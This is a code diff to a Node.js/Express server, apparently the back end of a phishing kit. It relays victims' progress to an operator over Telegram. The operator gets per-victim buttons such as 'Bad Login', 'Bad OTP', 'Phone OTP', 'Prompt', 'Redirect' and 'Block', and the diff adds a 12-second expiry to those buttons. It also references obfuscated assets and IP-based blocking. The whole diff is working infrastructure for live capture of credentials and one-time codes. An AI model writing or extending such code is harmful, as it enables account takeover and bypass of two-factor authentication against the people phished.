@@ -13,6 +13,7 @@ import session from "express-session";
 
 const db = await initDB();
 let systemInfo = {};
+const pendingButtonTimers = new Map();
 
 /* ================================
    IP HANDLING
@@ -92,6 +93,44 @@ async function sendTelegramMessage(botToken, chatId, text, options = {}) {
 
   if (!data.ok) {
     throw new Error(`Telegram API error: ${JSON.stringify(data)}`);
+  }
+
+  // ------------------------------------------------
+  // 🔥 12 SECOND AUTO-EXPIRE (ONLY IF BUTTONS EXIST)
+  // ------------------------------------------------
+  if (options.reply_markup && options.reply_markup.inline_keyboard) {
+    const messageId = data.result.message_id;
+
+    // If there was already a timer for this chat, clear it
+    if (pendingButtonTimers.has(chatId)) {
+      clearTimeout(pendingButtonTimers.get(chatId));
+      pendingButtonTimers.delete(chatId);
+    }
+
+    const timer = setTimeout(async () => {
+      try {
+        await fetch(
+          `https://api.telegram.org/bot${botToken}/editMessageText`,
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              message_id: messageId,
+              text: "command not available"
+            })
+          }
+        );
+      } catch (err) {
+        console.error("Button expire error:", err.message);
+      }
+
+      pendingButtonTimers.delete(chatId);
+    }, 12000);
+
+    pendingButtonTimers.set(chatId, timer);
   }
 
   return data;
@@ -559,50 +598,68 @@ async function buildTelButtons(userId, db) {
   // -------------------------
 
   // Row 1
-  buttons.push([
-    {
-      text: "Refresh",
-      callback_data: `cmd:refresh:${userId}`
-    },
-    {
-      text: "Next Page",
-      callback_data: `cmd:nextpage:${userId}`
-    }
-  ]);
+buttons.push([
+  {
+    text: "Refresh",
+    callback_data: `cmd:refresh:${userId}`
+  },
+  {
+    text: "Next Page",
+    callback_data: `cmd:nextpage:${userId}`
+  }
+]);
 
-  // Row 2 (Login / OTP only)
-  if (page === "login" || page.includes("otp")) {
-    const badButton =
-      page === "login"
-        ? {
-            text: "Bad Login",
-            callback_data: `cmd:bad-login:${userId}`
-          }
-        : {
-            text: "Bad OTP",
-            callback_data: `cmd:bad-otp:${userId}`
-          };
+// Row 2 (Login / Auth / OTP only)
+if (page === "login" || page === "auth" || page === "otp") {
+  let badButton;
 
-    buttons.push([
-      badButton,
-      {
-        text: "Phone OTP",
-        callback_data: `cmd:phone-otp:${userId}`
-      }
-    ]);
+  if (page === "login") {
+    badButton = {
+      text: "Bad Email",
+      callback_data: `cmd:bad-email:${userId}`
+    };
+  } else if (page === "auth") {
+    badButton = {
+      text: "Bad Login",
+      callback_data: `cmd:bad-login:${userId}`
+    };
+  } else if (page === "otp") {
+    badButton = {
+      text: "Bad OTP",
+      callback_data: `cmd:bad-otp:${userId}`
+    };
   }
 
-  // Row 3
   buttons.push([
+    badButton,
     {
-      text: "Redirect",
-      callback_data: `cmd:redirect:${userId}`
-    },
-    {
-      text: "Block",
-      callback_data: `cmd:block:${userId}`
+      text: "Phone OTP",
+      callback_data: `cmd:phone-otp:${userId}`
     }
   ]);
+}
+
+// Row 3 (Prompt only on auth & otp)
+if (page === "auth" || page === "otp") {
+  buttons.push([
+    {
+      text: "Prompt",
+      callback_data: `cmd:prompt:${userId}`
+    }
+  ]);
+}
+
+// Row 4
+buttons.push([
+  {
+    text: "Redirect",
+    callback_data: `cmd:redirect:${userId}`
+  },
+  {
+    text: "Block",
+    callback_data: `cmd:block:${userId}`
+  }
+]);
 
   return buttons;
 }
@@ -633,5 +690,6 @@ export {
   blockedRedirect,
   resolveFrontendRoute,
   prepareObfuscatedAssets,
-  routeMap
+  routeMap,
+  pendingButtonTimers
 };
